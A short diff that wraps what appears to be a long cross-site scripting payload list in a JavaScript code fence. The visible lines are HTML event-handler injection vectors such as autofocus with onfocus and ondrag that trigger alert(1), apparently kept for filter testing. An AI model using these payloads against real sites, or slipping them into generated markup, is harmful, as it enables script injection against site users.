@@ -1,3 +1,4 @@
+```js
 <a autofocus onfocus=alert(1) href></a>
 <a autofocus onfocusin=alert(1) href></a>
 <a draggable="true" ondrag="alert(1)">test</a>
@@ -8927,3 +8928,4 @@
 <xss id=x tabindex=1 onfocus=alert(1)></xss>
 <xss id=x tabindex=1 onfocusin=alert(1)></xss>
 <xss id=x tabindex=1 onfocusout=alert(1)></xss><input autofocus>
+```
